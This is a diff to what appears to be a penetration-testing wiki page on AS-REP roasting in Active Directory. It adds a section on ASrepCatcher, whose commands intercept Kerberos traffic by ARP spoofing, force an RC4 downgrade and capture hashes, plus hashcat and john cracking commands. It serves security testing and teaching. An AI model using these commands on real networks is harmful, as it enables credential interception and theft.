@@ -52,6 +52,8 @@ Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
 {% endtab %}
 {% endtabs %}
 
+
+
 Depending on the output format used (`hashcat` or `john`), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try [cracking the hashes](../credentials/cracking.md).
 
 ```bash
@@ -61,6 +63,27 @@ hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
 ```bash
 john --wordlist=$wordlist ASREProastables.txt
 ```
+
+### ASREProast w/o domain credentials
+
+The caveat with these previous tools is that they require knowledge of the users who do not require Kerberos pre-authentication, which is typically achieved with domain credentials.
+
+[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) catches AS-REP packets in transit across the network by placing itself in a man-in-the-middle position.<br>
+Moreover, the tool <ins>forces client workstations to use RC4</ins> by altering the Kerberos negotiation.
+
+```bash
+# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
+ASRepCatcher.py relay -dc 192.168.1.100 --keep-spoofing
+
+# Disabling ARP spoofing, the mitm position is obtained differently
+ASRepCatcher.py relay -dc 192.168.1.100 --disable-spoofing
+
+# Passive listening for AS-REP packets, no packet alteration
+ASrepCatcher.py listen
+```
+
+The tool natively uses ARP spoofing. However, it can be disabled by the attacker to use a different mitm method.
+
 
 ## Resources
 
